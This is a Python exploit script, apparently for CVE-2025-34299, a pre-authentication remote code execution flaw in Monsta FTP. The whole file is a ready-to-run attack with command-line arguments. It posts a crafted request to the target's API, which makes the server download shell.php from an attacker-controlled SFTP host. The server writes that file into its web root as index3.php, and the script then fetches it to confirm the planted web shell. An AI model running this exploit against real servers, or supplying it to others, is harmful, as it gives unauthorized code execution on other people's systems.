import requests
from clogsec import Logger
import argparse

logger = Logger(file_name="cve‑2025‑34299", log_level="INFO", correlation_id="cve‑2025‑34299")

def exploit_monsta_ftp(hostname, external_sftp_ip, username, password, port):
    """
    Exploits the pre-authenticated Remote Code Execution vulnerability in Monsta FTP.

    Args:
        hostname (str): The hostname or IP address of the Monsta FTP server.
        external_sftp_ip (str): The IP address of the malicious SFTP server.
        username (str): The username for the SFTP connection.
        password (str): The password for the SFTP connection.
        port (int): The port for the SFTP connection.

    Returns:
        tuple: A tuple containing the status code of the exploit request and the response content.  Returns (None, None) on error.
    """

    csrf_token = "6e080f63ea774944feedef49eb77c6fffdd8291b9c6561022696b9222942644e"  # Replace with an actual dynamically obtained token if needed

    # Construct the exploit payload
    payload = {
        "connectionType": "sftp",
        "configuration": {
            "host": external_sftp_ip,
            "remoteUsername": username,
            "initialDirectory": "/",
            "authenticationModeName": "Password",
            "password": password,
            "port": port
        },
        "actionName": "downloadFile",
        "context": {
            "remotePath": "/shell.php",
            "localPath": "/var/www/html/mftp/index3.php"
        }
    }

    # Construct the POST request data
    data = {
        "request": str(payload),  # Convert the dictionary to a string
        "csrf_token": csrf_token
    }

    # Send the POST request
    try:
        response = requests.post(
            f"http://{hostname}/mftp/application/api/api.php",
            data=data,
            verify=False  # Disable SSL verification (for testing/lab environments only!)
        )

        # Check the response status code
        if response.status_code == 200:
            logger.success(f"Exploit request successful. Status code: {response.status_code}")
            # Check if the file was written by making a GET request
            get_response = requests.get(f"http://{hostname}/mftp/index3.php", verify=False)
            if get_response.status_code == 200:
                logger.success("File written successfully, verify response: ", get_response.text)
            else:
                logger.error("GET request failed: ", get_response.status_code)

            return response.status_code, response.text
        else:
            logger.error(f"Exploit request failed. Status code: {response.status_code}")
            return response.status_code, response.text
    except requests.exceptions.RequestException as e:
        logger.error(f"Request error: {e}")
        return None, None


def main():
    parser = argparse.ArgumentParser(description="Exploits the Monsta FTP RCE vulnerability.")
    parser.add_argument("hostname", help="The hostname or IP address of the Monsta FTP server.")
    parser.add_argument("external_sftp_ip", help="The IP address of the malicious SFTP server.")
    parser.add_argument("username", help="The username for the SFTP connection.")
    parser.add_argument("password", help="The password for the SFTP connection.")
    parser.add_argument("port", type=int, help="The port for the SFTP connection.")

    args = parser.parse_args()

    status_code, response_content = exploit_monsta_ftp(args.hostname, args.external_sftp_ip, args.username, args.password, args.port)

    if status_code:
        logger.info(f"Exploit status code: {status_code}")
        # logger.info(f"Response content: {response_content}")  # Be careful printing long responses


if __name__ == "__main__":
    main()
